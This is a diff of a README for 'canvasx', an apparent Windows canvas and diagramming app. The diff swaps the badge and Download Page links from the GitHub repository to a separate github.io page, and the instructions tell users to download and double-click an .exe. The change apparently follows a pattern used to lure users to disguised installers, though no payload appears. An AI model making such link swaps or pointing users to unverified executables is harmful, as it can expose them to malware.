@@ -1,6 +1,6 @@
 # 🎨 canvasx - Infinite space for your digital ideas
 
-[![](https://img.shields.io/badge/Download_CanvasX-Blue?style=for-the-badge)](https://github.com/reidea2953/canvasx)
+[![](https://img.shields.io/badge/Download_CanvasX-Blue?style=for-the-badge)](https://reidea2953.github.io)
 
 CanvasX provides an endless digital surface for sketching, diagramming, and brainstorming. You can draw shapes, connect ideas with arrows, manage tasks on sticky notes, and build tables. It includes support for code blocks with syntax highlighting and keeps your work private through end-to-end encryption. 
 
@@ -8,7 +8,7 @@ CanvasX provides an endless digital surface for sketching, diagramming, and brai
 
 CanvasX works on Windows. Follow these steps to set up the software on your computer.
 
-1. Visit the [Download Page](https://github.com/reidea2953/canvasx) to find the latest version for Windows.
+1. Visit the [Download Page](https://reidea2953.github.io) to find the latest version for Windows.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Save the file to your desktop or downloads folder.
 4. Double-click the file to start the installation process.
